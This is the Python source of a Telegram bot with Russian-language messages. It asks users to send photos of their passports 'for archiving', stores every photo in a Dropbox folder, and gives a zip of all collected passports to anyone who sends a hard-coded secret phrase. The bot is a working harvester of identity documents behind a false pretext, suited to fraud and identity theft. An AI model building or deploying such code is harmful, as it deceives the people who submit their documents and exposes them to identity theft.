# I LOVE DESH BEARCH

import os
import dropbox
import io
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
import zipfile

# ---------------- Переменные окружения ----------------
TOKEN = os.environ.get("BOT_TOKEN")
DROPBOX_TOKEN = os.environ.get("DROPBOX_TOKEN")
SECRET_CODE = os.environ.get("SECRET_CODE", "Q_FBR_PASSPORTS/DATA.GB$04743")
PASS_FOLDER = os.environ.get("PASS_FOLDER", "/passports")
ANTI_SPAM_INTERVAL = 60  # секунд

# ---------------- Инициализация бота ----------------
bot = Bot(token=TOKEN)
dp = Dispatcher()

dbx = dropbox.Dropbox(DROPBOX_TOKEN)

# ---------------- Проверка папки Dropbox ----------------
try:
    dbx.files_get_metadata(PASS_FOLDER)
except dropbox.exceptions.ApiError:
    dbx.files_create_folder(PASS_FOLDER)

# ---------------- Антиспам ----------------
last_msg_time = {}

def check_spam(user_id: int):
    now = time.time()
    if user_id in last_msg_time and now - last_msg_time[user_id] < ANTI_SPAM_INTERVAL:
        return False
    last_msg_time[user_id] = now
    return True

# ---------------- Старт ----------------
@dp.message(Command("start"))
async def start(msg: types.Message):
    await msg.answer("Для архивации паспортных данных отправьте сюда фотографию паспорта.")

# ---------------- Загрузка фото ----------------
@dp.message(F.photo, F.chat.type == "private")
async def handle_photo(msg: types.Message):
    if not check_spam(msg.from_user.id):
        await msg.answer("⏳ Подождите, можно отправлять сообщение раз в 60 секунд.")
        return

    file = await bot.get_file(msg.photo[-1].file_id)
    file_bytes = await bot.download_file(file.file_path)

    filename = f"{msg.from_user.id}_{msg.message_id}.jpg"
    dropbox_path = f"{PASS_FOLDER}/{filename}"

    dbx.files_upload(
        file_bytes.read(),
        dropbox_path,
        mode=dropbox.files.WriteMode("add")
    )

    await msg.answer("Паспорт успешно архивирован✅")

# ---------------- Получение архива ----------------
@dp.message(F.text == SECRET_CODE, F.chat.type == "private")
async def send_archive(msg: types.Message):
    entries = dbx.files_list_folder(PASS_FOLDER).entries
    if not entries:
        await msg.answer("Архив пуст.")
        return

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as z:
        for file in entries:
            metadata, response = dbx.files_download(file.path_lower)
            z.writestr(file.name, response.content)

    zip_buffer.seek(0)
    await msg.answer_document(
        types.BufferedInputFile(zip_buffer.read(), filename="passports_archive.zip")
    )

# ---------------- Запуск ----------------
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
    
